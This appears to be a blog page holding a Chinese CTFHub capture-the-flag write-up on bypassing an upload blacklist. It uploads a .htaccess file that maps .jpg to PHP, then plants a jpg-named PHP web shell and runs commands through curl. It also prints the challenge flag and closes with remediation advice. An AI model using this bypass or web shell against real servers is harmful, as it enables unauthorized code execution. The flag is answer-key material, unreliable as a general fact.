@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 文件上传 .htaccess Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 文件上传 - .htaccess</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 文件上传</span>
+            <span class="tag"># .htaccess</span>
+            <span class="tag"># RCE</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - .htaccess</li>
+            <li><strong>题目方向：</strong>Web - 文件上传</li>
+            <li><strong>运行环境：</strong>Apache 2.4.38 / PHP 7.3.14</li>
+            <li><strong>题目目标：</strong>利用 Apache 配置文件解析规则绕过黑名单，获取服务器权限并读取 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>首页源码中的后端逻辑只按上传文件名后缀进行黑名单检查，拦截了 <code>php</code>、<code>php5</code>、<code>phtml</code>、<code>jsp</code> 等后缀，但没有禁止 <code>.htaccess</code>。上传文件会保留原始文件名并写入 Web 根目录下的 <code>upload/</code>。</p>
+        <p>该目录运行在 Apache 中且允许 <code>.htaccess</code> 生效，因此可以先上传配置文件，将 <code>.jpg</code> 扩展名交给 PHP 处理器，再上传一个后缀为 <code>.jpg</code> 的 PHP Payload。这样既绕过了扩展名黑名单，也能通过 Web 访问触发代码执行。</p>
+        <pre>$ext = pathinfo($name)['extension'];
+$blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", ...);
+if (!in_array($ext, $blacklist)) {
+    move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name);
+}</pre>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>构造 .htaccess：</strong>添加一条 <code>AddType</code> 指令，使目标目录中的 <code>.jpg</code> 文件按 PHP 解析。
+                <pre>AddType application/x-httpd-php .jpg</pre>
+            </li>
+            <li>
+                <strong>上传 .htaccess：</strong>黑名单未覆盖无普通扩展名的配置文件，提交后返回路径 <code>upload/.htaccess</code>。
+                <pre>curl -F "submit=Submit" \
+  -F "file=@.htaccess;filename=.htaccess;type=text/plain" \
+  "http://&lt;challenge-host&gt;:10800/"</pre>
+            </li>
+            <li>
+                <strong>构造 PHP Payload：</strong>将命令执行代码命名为 <code>cmd.jpg</code>，通过 <code>c</code> 参数控制待执行命令。
+                <pre>&lt;?php
+header("Content-Type: text/plain; charset=UTF-8");
+system($_GET["c"]);
+?&gt;</pre>
+            </li>
+            <li>
+                <strong>上传 Payload 并验证：</strong>上传成功后返回 <code>upload/cmd.jpg</code>。访问该文件，确认服务端以 <code>www-data</code> 身份执行命令。
+                <pre>curl -F "submit=Submit" \
+  -F "file=@cmd.jpg;filename=cmd.jpg;type=image/jpeg" \
+  "http://&lt;challenge-host&gt;:10800/"
+
+curl --get \
+  --data-urlencode "c=id; pwd" \
+  "http://&lt;challenge-host&gt;:10800/upload/cmd.jpg"</pre>
+            </li>
+            <li>
+                <strong>定位 Flag：</strong>列出 Web 目录中的文件，发现题目动态生成的 PHP 文件。
+                <pre>find /var/www -maxdepth 5 -type f -printf "%p\n" 2&gt;/dev/null</pre>
+                <pre>/var/www/html/flag_2410013318.php</pre>
+            </li>
+            <li>
+                <strong>读取源码：</strong>直接访问 PHP 文件不会显示注释内容，使用已获得的命令执行能力读取其源代码。
+                <pre>cat /var/www/html/flag_2410013318.php</pre>
+                <pre>&lt;?php // ctfhub{0eca758368aad652907dd246}</pre>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">ctfhub{0eca758368aad652907dd246}</div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>禁止配置文件上传：</strong>服务端应对文件名做严格白名单，显式拒绝 <code>.htaccess</code>、<code>.user.ini</code> 等控制文件。</li>
+            <li><strong>禁止覆盖解析规则：</strong>上传目录关闭 <code>AllowOverride</code>，或使用 <code>&lt;Directory&gt;</code> 配置禁止修改 PHP 处理器。</li>
+            <li><strong>重命名存储：</strong>由服务端生成随机文件名和固定安全扩展名，不能保留用户控制的文件名。</li>
+            <li><strong>隔离上传目录：</strong>将文件存放在 Web 根目录之外，并关闭该目录的脚本执行权限。</li>
+            <li><strong>校验文件内容：</strong>结合真实文件头和 MIME 类型进行校验，同时保持 Web 服务最小权限。</li>
+        </ul>
+    </div>
+</body>
+</html>
